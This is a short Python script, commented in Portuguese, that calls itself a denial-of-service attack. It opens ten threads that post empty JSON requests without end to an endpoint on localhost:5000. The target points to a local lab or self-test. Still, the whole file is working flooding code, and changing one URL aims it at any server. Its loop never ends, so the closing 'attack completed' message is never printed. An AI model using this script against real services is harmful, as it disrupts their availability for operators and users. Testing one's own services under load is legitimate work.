import requests
import threading

# Configurações do ataque
url_alvo = 'http://localhost:5000/processamento'  # Endereço
num_threads = 10  # Número de threads para enviar requisições simultâneas

def attack():
    while True:
        try:
            # Envia uma requisição POST vazia para o endpoint alvo
            requests.post(url_alvo, json={'dados': ''})
        except Exception as e:
            print(f"Erro durante requisição: {e}")

# Inicia threads para realizar o ataque simultâneo
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# Aguarda todas as threads terminarem
for thread in threads:
    thread.join()

print("Ataque DoS concluído.")
